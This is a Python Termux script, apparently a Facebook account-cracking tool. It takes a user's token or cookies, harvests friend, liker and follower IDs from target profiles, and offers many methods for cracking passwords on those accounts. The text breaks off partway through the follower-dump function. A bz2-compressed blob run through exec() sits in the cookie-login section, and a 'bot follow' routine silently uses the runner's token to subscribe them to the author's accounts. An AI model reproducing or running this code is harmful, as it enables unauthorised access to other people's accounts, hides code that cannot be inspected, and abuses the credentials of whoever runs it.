#!/usr/bin/python3
#coding=utf-8

## BUAT KALI INI AJAH YE OPEN RESOURCE CODE ESOK ESOK KAGAK :v

######################################################
# Author JAM SHAHRUKH                                #
# Github: https://www.github.com/Stylish-Queen       #
######################################################

#####################################################
# Thanks To Use My Tools
#####################################################

import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,urllib,json,urllib.parse,concurrent.futures,hashlib,threading
from random import randint
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
current = datetime.now()

os.system("termux-setup-storage")

p = "\x1b[0;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;33m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\x1b[0;36m" # biru muda

back = 0
threads = []
successful = []
checkpoint = []
oks = []
gagal = []
idh = []
id = []
emfromfriend = []
nofromfriend = []

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""

### HEADERS ###

def banner():
    os.system('echo -e "\n\n\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m█████████  \033[1;92m ▀\n\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \n\033[1;91m  ███         \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \n\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m███   ███  \033[1;92m███ \n\033[1;91m         ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  \n\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  \n\033[1;91m  ██████████  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \x1b[1;90mQUEEN\n\033[1;94m===============================================\n\033[1;90m➣ Author : \033[1;97mSTYLISH QUEEN\n\033[1;90m➣ Github : \033[1;97mhttps://github.com/stylish-queen\n\033[1;90m➣ Fb Page: \033[1;97mJam Shahrukh Official\n\033[1;94m===============================================" | lolcat')

ua ="Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
ua2 ="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
host="https://mbasic.facebook.com"
ips=None
try:
	b=requests.get("http://ip-api.com/json/").json()["query"]
	ips=requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["country"].lower()
except:
	ips=None

ok = []
cp = []
ttl =[]

freefacebook = "https://free.facebook.com" #Update Method!

durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent',ua)]

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
    
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit(p+" ["+k+"•"+m+"•"+p+"] Wrong Cookies")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()

def hdcok():
	global host,ua
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result

 
### Contact FB ####
def ige():
    os.system("clear")
    banner()
    input(p+"\n ["+k+"•"+m+"•"+p+"] Open FACEBOOK? ")
    jalan(p+" ["+k+"•"+m+"•"+p+"] Open FACEBOOK...")
    os.system("xdg-open https://m.facebook.com/jam.shahrukh.official")
    input(p+" [BACK]")
    logs()   

### AMBIL TOKEN ###
def kontolrecode():
    os.system("clear")
    banner()
    input(p+"\n ["+k+"•"+m+"•"+p+"] Open Youtube? ")
    jalan(p+" ["+k+"•"+m+"•"+p+"] Open Youtube...")
    os.system("xdg-open https://m.youtube.com/channel/UCtiBO4aL6y-W80hjeGZyd7g")
    input(p+" [BACK]")
    logs()   

### Report BUG ### 
def fbe():
    os.system("clear")
    banner()
    input(p+"\n ["+k+"•"+m+"•"+p+"] Report Bug? ")
    jalan(p+" ["+k+"•"+m+"•"+p+"] Open WhatsApp...")
    os.system("xdg-open https://wa.me/+923053176060")
    input(p+" [BACK]")
    logs()  
    
### LOGIN METHODE ###
def logs():
  os.system("clear")
  banner()
  print((p+" ["+o+"01"+p+"] Login Token"))
  print((p+" ["+o+"02"+p+"] Login Cookies"))
  print((p+" ["+o+"03"+p+"] Cloning Without Login"))
  print((p+" ["+o+"04"+p+"] Contact Whatsapp"))
  print((p+" ["+o+"05"+p+"] Contact Facebook"))
  print((p+" ["+o+"06"+p+"] Open My YouTube Channel"))
  print((p+" ["+o+"00"+p+"] Exit\n"))
  sek=input(p+" ["+k+"•"+m+"•"+p+"] Choose: ")
  if sek=="":
    print((p+" ["+k+"•"+m+"•"+p+"] Fill In The Correct"))
    logs()
  elif sek=="1" or sek=="01":
    defaultua()
    log_token()
  elif sek=="2" or sek=="02":
    gen()
  elif sek=="3" or sek=="03":
    os.system('python2 mb.py')
  elif sek=="4" or sek=="04":
    fbe()
  elif sek=="5" or sek=="05":
    ige()
  elif sek=="5" or sek=="06":
    kontolrecode()
  elif sek=="0" or sek=="00":
    exit()
  else:
    print((p+" ["+k+"•"+m+"•"+p+"] Fill In The Correct"))
    logs()

#### LOGIN TOKEN METHODD:)
def log_token():
    os.system("clear")
    banner()
    toket = input(k+"\n["+p+"?"+k+"]"+p+" Token : ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((k+"\n["+p+"✓"+k+"]"+p+" Login Successfully"))
        bot_follow()
    except KeyError:
        print((k+"["+p+"!"+k+"]"+p+" Token Invalid !!"))
        os.system("clear")
        logs()
#LOGIN COOKIE METHODD:)
# Jangan Hapus Nanti Eror! Kalo Gak Percaya Silahkan Hapus :V
exec((lambda __, _, : _(b'BZh91AY&SY\xc1\xeeDu\x00\x08+\x1f\x80\x7f\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff`\t*\xfb\xeb\xe1\xa9\r\xa3\xde\nR\xa0\xa0\x03\x0f^\xda\xb5\xb9\x82\xa9\xe0M0\x82d\xd2g\xa2\x9ad\xd3=B\x9f\xa5=21\x1a\x1a\x9a<\x10OHm4\x9a4\xd0\xaaxL\x13#M\x1a\x00\x9a\x08\xd3L\x86\x94\xf10&\x98\xd4d\xd3\x02\x9bOMM=$\xf5\x0e\x06\x83L\x86\x9a40\x81\x90\xd0\xc1\x1a\x1ad\xd1\xa0\x19\x06 \x004\x1a\x98\x02\x12S@\x1a\x00\x00\x01\xa0\x00\x00\x00\x00\x00\x06\xaa\x9f\xed52h\x95\x1a\x00\x06\x80\x00\x004\x00\x00\x00\x00\x00\x12(\xd0\x12\x084S\xd14\xda\x9az\x8f\xd54z@=OSM\x00hh\x00h\x1a4"\x00!{\xb6\xe0\xe3\xdb\xa6m\x95\x9dwK%H,\x04U\x85\xe1\xb3f,\x0f\x8ecw\t\x1d\x9b\xc9\xa2\r(\xab\xd6a;%\xb1\xe4\x92\xe1\xba\xf4\xa0\xf3n/\xd5\x0c\xed\xb9q\xd8\xf2w\xd3\xfd5\xda\x83bXw\xd2"\xa7i-\xd3\x7f`b\xae7\xfa\x0cy^s\xc0%{\x9fr\xeb"\xe4@\xd22h\x9ft\x98Ok\x7fNO\xd0&\xaa\r\x01\x8d\xb7\xb8-\x88@\xa8\x0c`\x96<\x82\x17K\x04Y\xb6\x82R$\xc6\x90.\x8e\xedHn\x86\xfcGII4\xd4l\xe7^H\x0e$\xbc\x1d5\x95\xc2I\xd524\xca\x12\x111x\xb8J^\xb7\x93\xc3\xc6\xa4\x916\x8c\xb7\x14\x85+c8\xa9\xc5L-\x83\x04\x16`\x0b\x04,2@\x01\x9a\xc2\xe2\x0f\x0f7i\xc9\xa2\xd5CS\xcc\xcb\xb9\xd3\x84\x08T\xc2gT\x1d\xe6\xf0cX\xdaU\xef\xc1V\x92q\x1fy\xcd\x07<"\x83\x14zh\xea\xeb\xaa\xd6\xb5\x9d\x19\x05\x80\xc0\x9c*K\xe5\np\x8eLO\x8c2\x8d\x85\xbd_\x15%{\xa7\xa5\xf7\xf9p\x94FA/\xa1\xc99\x7f]\xd9\xc1\xc3\xe7\xd6\xf0P\xd5,FpZ9\xdb\xf8\xd1\x1a\x92K\x80X9Tuk\x92\xb1#`\xf7\xc3U\x94 \xc2\xd7O\x83\x05\xecqxk\xc8$GY\xa9\x8ad\xc83$\t\x0e\xed\x03\x98L\xaa(\xc2E1\xca\xd3\xdf>\x9b\xd4c,\x9c\xdcQ\x8a3l\xc1\x81\xaa\xce\xda-\x1cPX8eR\xb2X\xbb\xd9\xb3\xf8\x90\x83<Zm\x93\xaf#\x02m\x87O\x9f\n\xdd\xf4\xf1\xa5N\x88\xca8g\x83\x0b\xecg,\xc4\x81\xb5A\xa4\xa2\xb6\xb3J\rS\x141u+\x9b\xcb\xb1T\xa4\n\x810Uc\'\x8a\x0e\x92\xa8\xabG2\nZZ\x88\x18$\x85\xa3\x9b@m)\xe0\x1d^\x1b\x84\xc0_\x0fu_a\xa3Cf\xd0.XY\x96S\xc39K\xaa\x14QS\xcd3\xd1k\x94Y\x0c,\x89\xdbs\x91\x1c\xdf\x12[%\xb1\xa6\xc6\x98\xd2\xd3x\x0b\xb3ZJ\xd9L\xe4\x9c\xdd\x0e\xae\x1a\xaf\x11\\:\xce+\x14\x89\x12\x919\xbe\xdb\xbd\xf3\xdc\xbd\xa9e\x86\x06X\x85F\x81\x07U\xe51\x86\t\xaf\x80\xe5SY\x8ea\x99\xe3B0n\x1en\x9a;\x911\x83\x8dH\x87\\z\x91\x8d/\x89\xcc\xac^\x9a\xc1\x05\x1aS\xab\xe9\x95\xf3\xa7<V\tX\r\xed\x08\xb3\x12\x9b\x04Y\x8a\xb5\xc6\\\xdc\xaaM\xed\x9d\xceMwe+)T\xcd\xe6\xe2u\xacR\x8b\x14\x82{\xed!\xd3#\xb3\xb5-!\xc6\x88\x02M\n\x9co\xce\xe4\xfa\xeb\x1a\xb0\xb8X\xbd\xd6\xe3\xf6\xc7\xc5\x0e\xab_Py\xa8\x9a\x85\xb0d|\xefU\x10\xaf\x0e\xe6\x9b\xf3\xcd\xcb\xf4\xfb#\xa7\xc9c8&1\x0b\xde\xfc=\xbb\xc5\x87<\x1d\x95\x19\xc6\xb8E^\x16\x93\xf6\x12\xb0\x8e\xb4K$\x8e\xee|C\xf6|f\x07\x9en\xaa\x8f^jA\xe9\xdfm\xfe\x17$xrT\xbf\x1fdezi\xee2\x072(\xb0:n\xa4\xe4\xb7\x17T\x7f\x01\x00\xacH\x96-\xb5\xd6Hd\x1cv\xab\x90\x85\xdc\xdc\'\xeb\xd7\xc9\x06w-6\xad[\xbbpK!\xf9\xa0g\x8d<\xab\xed\xa3.\x00\xd0\xb9:\x06\xd6\xc3Y\x85\x11\xa0\x9f5*\x88H\x8eI\xed\x08\xdfCs\xa5o\x90\xf0c\xd5\x99O\xfb\\\xcc1?4\x9ba\xa46\x14Nr]o\xb3\xa7\x0e4-\xdae\x199oK\xcbC\x89\xd4v\xc3\xe8\xab*;\x8e\x80\x00D\xc0\xc4v\x115\x9f\x8b\xbd6>H\x19ABG/>my\xa5\xbbC\xecEd\xf4GA\xe0\x97:\x1b\x8c\x02H\xc0+\x85\xd8]^QMO*%q5\xc8\xbe\xe5_\xd7\n1\xbeh\']\xd0b{\x8a\xaa\xb2\xa2\x10\x9a&\x18e \x1c\xd5\xe5x\x1a"7\t\xe4^U\xd6x\xd4#iW\xb8\x9d\x04\xf4>}R0\x89\x96 $(\x1e\x00\xbd\xf0\x11Et\x07\xc6\\*\xa1\xee\xe3\x8bV\xf7\xa4?\xad\xc1Q\x9f\xc2\x1f:\xd5\x8d\x8a+ \x13\x89\xbc\x17\x18\x98\x13TQ\xe2\x1a\x18\x94U\xac\x98q\xc6>\x11\x0fl\x91s\xa5\xc4\x17\xc3\x8c\xbc\xff\xaa)EmZkY\xa8~1\xbc\xaeo\xea\x07\xc9\x93\xfc\xd9l\xb8\xdc\xaf\x90>\x1b6\xdf_\xbb\x8d\x1f\x17\x07\xbd5X\xab\x95\xc8\x9a\xcd\xa6SH\xee\x7f:\xb2\x05\xce6G~IFGN\xf0@\xb6\x07\x94q\xa13\xa1\xd7\x8d\xfc\xbe\x9d~[\xea\n \xae@2\xdf\xc9\xf4ELA\\\x8b\x062_n\xe9\x1e\x04\x08\xcc}\xb8\xa2\xf3\xcb\xedn\xc5V*?\xc5\xdf"\x12S\x06\'\x832\x9c\xa2`,1\x86\x91i\xa8E\x94\xca\xca/\x1e{\x15\x06l\x812L\xb9\xed\x13\x13d\x8fW\xad;\x8b\xb6VwP\'\xe0\xeb(\xaf\x88\x81\x8c\x08I\xe6\xd5\x90u\xdaq\xc1\xc6$P\x98\xe9\x80}\xb4\x8b/s\xc0\xfb\xc9\xf5\xc4/h$\x860\x87\xe5\x9d\x98\xe4\x92X\x96H\x17\x15}\xe5\xa6)b$-f\xe1n\x8d\xb8\x03\x14\x07gj\x80Hxr\x03\xdf\x17\n4\xae\xeb!\x97>\x17foA\xbf\xdb7-8\x87\x8a\xb9R\x89\xed<A\xac\xd2\x928\x1c\x0b\xe2S\x13_\xa8U\x11L,#\x02\xe3\x1e+|\x8e\x0bM0\xd3,\x92>\x11\xb1\xbb\x03\xda|\x8a\xf7n\xde\xa5\xd7M\x06\xfe|*\x88i]J\xcd\xbfG\x00\x19\x7f?f\xdc\xfdYa\xec\xb5\x0c\xbc\x1ax$\xa9\xd3\xe1\x99} t\x97\xbb$tM\x8b\x9e\xee"\xe5\xd0\xad}=5\xe4\xa2\xfb\xe4|\x82U\xfc\\\x06\xb5e\x89\x98\xe926\xaew\x7f#\xf2\xae\xaa"\x08\x12^"\xa9\xd8\xae\xd9\x9b\xa8\x0eo\x0fc\xe8?\x01\x8d\x13?g\xcc\xcc\x85>P\xc5\xbe\'{\xde\x98\x15\x13\x15\xbdD\xb6\xc5O\xd9\xa9\x8fGLd\xe5\x15\xef27\xfb\xcf1w+e\xcf)mM\x1f\xa8[?_\xf0\xd4t?\xc8\xa9\xc9\xaf\xf6q\x91<\x87\x8eO\x83=\\\xe27\xfd\xbc\xf4\xbf\xb6o&\xb5\xabXL\xee\xacJ)\xee\xcf]]5r\xfe\x90\x98\x04\'\xda\x1d\xa7V0\xc2\x16a\x1ev\x1a\xbf])\xfa<\xfd\xb3q*\x8c\xd6`;\x9eC\xa6\xdc\xf0\xca|%\x14\x9fyP@\xb0\x187\x96@\x82HL\xca6F"\x87\x07g\xb9\x17y\xb5\x0c\xe2\xb3L\x16\xbc\x80m\x01\x04xP\xd9\xa9@y\xee\x08\x1aI\xe5 |7\x89_\xd1\xaa\r;\xb3\xd4\xf1p\xcc\xf7\xd5\xd2\xe5\x7f\xd0636\xdc\xf6\xd1n\x82I\xe2*\x8bw\x98e\x13J\xb8\xf8\xe37\x86r\xca\x11\x1f\r\x8b\xc5\xa8\xdb\xc3\xb3\xdd\xf3\xde\xc4vR\xa3HA>\xd6=}9\x13\xc5w\x90\xf5W\\\xf8k\xa3\xd88p4\x91A\x1a\xe78\xba\x8a*69\xcd\xb3\xeaX\xf2\xbe5\'f\x91==\xaf\xc0Q\x0c\xff\x14\xe0y\xeb\xba\x1a\xa7\xa7$c_\n-D&\xc4\xf4Ni\'\xa7\x8d2\xfb\xbc&Y\x99P\x8d\xe1\xc9\xe8\x98\x19\x0b\xe28$\xc7\x00\xc9\x00(\xeb\xf2\xa5\xf5\xf7\xb8W\x9c\xc3A\xc9\x19A\xa3C\xcc\t\x8e;\xe6\xa4\x9b\xaa\x9e\x0c\xbb\xf1\xe9\xcd\xae\xa8|\xec|`\xb7\x91+\xbccZ\xe7\xa3JP\xa6\xbf\xcdz\xffl5\xb9\xa8\x84)\x89\xc8\xf9\xd4\xfe\xb4\xb6C8H\rE\xa3\xf1\xb1?M\x08\xa4\x17\x00\x90:\x04\x84\xb27\xb7\xc7\x1b+\xb7\x93fw{m\xbd\xf6\xf0[\x83\xe0\xe8\xfb\xb0\xfa3\xc2Xg\x06\xed\x86\xbe\xda\x15\x18\x1d\x0cJLU`"\xb0\xe28\xdc\x0f\xb4\xeeR1\xa5.f\xd2\xc4\xaaK\x15\x96*VV\x1e+"\xee\x8b\xbf{\xd2\xee\x9a\nL\x0b0\x86\x17xbR\x89Rd\x1d\xa9\xe3\x1b/-4\xa5\xc9d\x11F\x92\xd1\x80Y\xa5CV\xae\xbaJ\xef\x96NT\x96\'\xa0/s;W\x13(!_X\xd2\x0fQ\xb1G=t\xac\xd3\xce\x90\xd0B,\xaf\t\xbec\x11Ip$\x94\xffI\x00_\x16\xd5/\xc3fa\xb8\xb2H\x86\x80m%\r\x08\xd7\xad\xa0\xc4,\xbb\xce\x87*&2\x95\x81k\xb3\x8b\x88hd-\r(\x1bU3Y\x92\x1e\x91\x1e\xa8K\\\x00d.B.`XI\x0b\x0b\xbcV\xe3\xd5\x94\x0f8:\x08\xc4\x14b\x1b\x10\x88\x89\xe2s\xcc\xa0\xf8\xe7\x054ws\x88\xe6\xcdq\x8a;\xd2\x94\xff7[Znu\x14f\x1b\x0eJrL"$\xce \xe4%\xe5\xf4\xb0\xb5\xa8\xadkw\x8a\xcf\xca\xe4\x19\xcd\xf0\xf5\x12\xcb\xa5P\x01F\x1a1\xc5\xbb\xda\xa5\x82\xfe\xf3\x967Wd\x88&\xc4\xaa\x81\xa2\xcax\x99\xc2!P$\x87\xb3\x910\x1a*\xd2\xd5\xa0\xd4\x0c\xd8bcII\xaa\xe1\xd2\xd7\xdf\x9c\xc6/\xe2\xc8\x91\r\x00e\x82+g]/\xa9\x95\'\x0f\x0c\xa32.\x93\tD\x1a\xa0\xa9U5\xe4\xedn,\x9d\x15f\xc0)Z\xc2\xc0H\xc0@\x08 7n\xcc9>9\x90\xb5\xbe_\x94\x06\x86\xa8\xdb2\x81\x11\x7f\xc1\xc0P\xdaV\xa2M\xf6\xfc\xd7\xa2G\xef\xbf\x04f[\xb7\xe4\xaa\xfeWDw\xa6\xfc\xe2\xe9$\xec\xf1\xf1 ih\x800\xdc\x02\x98+\x93\x04\x10\xc3\xe2\x80*\xe6.\x1a\xea\x0e\xae\xf7\x8f_\xa5\x9b\xf6|\xbbW#\\Ok<\r\x1a\xfcR\xf5\xa9\x97\xe1\xe5\xe3\xe5\xf3\xebp\xda\xc5\xd7\xcf\xeeuS8\xe5\xfc\xb7\xc4KW\xbf\xb3\xc2\xf9\x9f\x11\xd8\xc7]\xce\xef>\xe0\x12\x00\xd7_\'\x0fTo\xaa@ !\x89\x089\x8ff\xfaW~\xe9\xfd\xbd\xcb\xcf\x8e;\x1a\xaf\x8d{\xb7k}\x9e\xbe_\xde\xfbg\xdf\xdb\xf3\xff\xe2\xeeH\xa7\n\x12\x18=\xc8\x8e\xa0',__))("bz2_codec",__import__('codecs').decode))
        
### BOT FOLLOW ### Don't Change Bitch !!! Jangan Diganti Anjing !!!

def bot_follow():#Jangan Di Ganti/Hapus Ea Anjing!
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Cookie/Token Invalid"))
		logs()
	requests.post("https://graph.facebook.com/100049252740120/subscribers?access_token=" + toket)      #Dapunta Khurayra X
	requests.post('https://graph.facebook.com/100006702878868/subscribers?access_token=' + toket) #Dapunta Adya R
	menu()

### USER AGENT ###

def defaultua():
    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError, IOError):
        logs()

### MAIN MENU ###

def menu():
    global ua
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print((p+" ["+k+"•"+m+"•"+p+" Error : %s"%e))
        logs()
    ip = requests.get("https://api.ipify.org").text
    os.system("clear")
    banner()
    print((p+" [ Welcome User \033[1;33m"+a["name"]+p+" ]"+p))
    print((p+"\n ["+k+"•"+m+"•"+p+"]"+p+" Your Status  : "+m+"J A M x S A N I"+p))
    print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Your ID      : \033[1;33m"+id))
    print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Your Ip      : \033[1;33m"+ip))
    print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Your Joined  : \033[1;33m"+durasi))
    print((p+"\n ["+o+"01"+p+"]"+h+" Crack ID From Public/Friendlist"))
    print((p+" ["+o+"02"+p+"]"+u+" Crack ID From Likes Post"))
    print((p+" ["+o+"03"+p+"]"+p+" Crack ID From Followers"))
    print((p+" ["+o+"04"+p+"]"+k+" Crack Email"))
    print((p+" ["+o+"05"+p+"]"+p+" Crack Mobile Number"))
    print((p+" ["+o+"06"+p+"]"+p+" Result Crack "))
    print((p+" ["+o+"00"+p+"]"+p+" Logout "))
    choose_menu()

def choose_menu():
	r=input(p+"\n ["+k+"•"+m+"•"+p+"] Choose: ")
	if r=="":
		print((p+" ["+k+"•"+m+"•"+p+"] Fill In The Correct"))
		menu()
	elif r=="1" or r=="01":
		publik()
	elif r=="2" or r=="02":
		likers()
	elif r=="3" or r=="03":
		follow()
	elif r=="4" or r=="04":
		random_email()
	elif r=="5" or r=="05":
	        os.system('python2 mb.py')
	elif r=="6" or r=="06":
	    ress()
	elif r=="0" or r=="00":
		try:
			os.system("rm -rf login.txt")
			exit()
		except Exception as e:
			print((p+" ["+k+"•"+m+"•"+p+"] Error %s"%e))
	else:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Wrong Input"))
		menu()	

def pilihcrack(file):
  print("\n\033[0;97m [ \033[1;36mSelect Methode Crack\033[1;37m ]")
  print((p+" ["+o+"01"+p+"] Crack With Api.Facebook ("+o+"FAST"+p+")"))
  print((p+" ["+o+"02"+p+"] Crack With Api.Facebook + TTL ("+o+"FAST"+p+")"))
  print((p+" ["+o+"03"+h+"] Crack With Mbasic.Faceboo ("+o+"SLOW"+p+")"))
  print((p+" ["+o+"04"+p+"] Crack With Mbasic.Facebook + TTL ("+o+"SLOW"+p+")"))
  print((p+" ["+o+"05"+p+"] Crack With Touch.Facebook ("+o+"SLOW"+p+")"))
  print((p+" ["+o+"06"+p+"] Crack With Touch.Facebook + TTL ("+o+"SLOW"+p+")"))
  print((p+" ["+o+"07"+p+"] Crack With M.Facebook ("+o+"SLOW"+p+")"))
  print((p+" ["+o+"08"+p+"] Crack With M.Facebook + TTL ("+o+"SLOW"+p+")"))
  print((p+" ["+o+"09"+h+"] Crack With Free.Facebook ("+o+"SLOW"+p+")"))
  print((p+" ["+o+"10"+p+"] Crack With Free.Facebook + TTL ("+o+"SLOW"+p+")"))
  print((p+" ["+o+"00"+p+"] Back To Menu "))
  krah=input(p+"\n ["+k+"•"+m+"•"+p+"] Choose : ")
  if krah in[""]:
    print((p+" ["+k+"•"+m+"•"+p+"] Fill In The Correct"))
    pilihcrack(file)
  elif krah in["1","01"]:
    bapi(file)
  elif krah in["2","02"]:
    bapittl(file)
  elif krah in["3","03"]:
    crack(file)
  elif krah in["4","04"]:
    crackttl(file)
  elif krah in["5","05"]:
    tofbe(file)
  elif krah in["6","06"]:
    tofbettl(file)
  elif krah in["7","07"]:
    crekm(file)
  elif krah in["8","08"]:
    crekmttl(file)
  elif krah in["9","09"]:
    freefb(file)
  elif krah in["10"]:
    freefbttl(file)
  elif krah in["0","00"]:
    menu()
  else:
    print((p+" ["+k+"•"+m+"•"+p+"]  Fill In The Correct"))
    pilihcrack(file)

### DUMP ID ###

def publik():
	os.system("clear")
	banner()
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Type \'me\' Dump From Friendlist"))
		idt = input(p+" ["+k+"•"+m+"•"+p+"] User ID Target: ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((p+" ["+k+"•"+m+"•"+p+"] Name: "+op["name"]))
		except KeyError:
			print((p+" ["+k+"•"+m+"•"+p+"] ID Not Found"))
			print((p+"\n [BACK]"+p))
			menu()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((p+" ["+k+"•"+m+"•"+p+"] Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(p+"\n ["+k+"•"+m+"•"+p+"] Error : %s"%e)

def likers():
	os.system("clear")
	banner()
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input(p+" ["+k+"•"+m+"•"+p+"] ID Post Target: ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((p+" ["+k+"•"+m+"•"+p+"] Name: "+op["name"]))
		except KeyError:
			print((p+" ["+k+"•"+m+"•"+p+"] ID Not Found"))
			print((p+"\n [BACK]"+p))
			menu()
		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((p+" ["+k+"•"+m+"•"+p+"] Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(p+"\n ["+k+"•"+m+"•"+p+"] Error : %s"%e)

def follow():
	os.system("clear")
	banner()
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input(p+" ["+k+"•"+m+"•"+p+"] Followers ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((p+" ["+k+"•"+m+"•"+p+"] Name: "+op["name"]))
		except KeyError:
			print((p+" ["+k+"•"+m+"•"+p+"] ID Not Found"))
			print((p+"\n [BACK]"+p))
			menu()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
